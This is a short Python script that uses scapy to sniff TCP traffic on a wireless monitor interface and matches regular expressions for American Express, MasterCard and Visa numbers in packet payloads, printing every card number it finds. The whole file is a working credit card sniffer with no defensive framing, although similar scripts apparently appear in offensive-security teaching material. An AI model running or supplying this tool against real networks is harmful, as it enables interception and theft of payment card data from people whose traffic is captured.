import re
from scapy.all import *


def find_credit_card(pkt):
    raw = pkt.sprintf('%Raw.load%')
    american_re = re.findall('3[47][0-9]{13}', raw)
    master_re = re.findall('5[1-5][0-9]{14}', raw)
    visa_re = re.findall('4[0-9]{12}(?:[0-9]{3})?', raw)

    if american_re:
        print('[+] Found American Express Card: ' + american_re[0])
    if master_re:
        print('[+] Found MasterCard Card: ' + master_re[0])
    if visa_re:
        print('[+] Found Visa Card: ' + visa_re[0])


def main():
    conf.iface = 'mon0'
    try:
        print('[*] Starting Credit Card Sniffer')
        sniff(filter='tcp', prn=find_credit_card, store=0)
    except:
        exit(0)

if __name__ == '__main__':
    main()
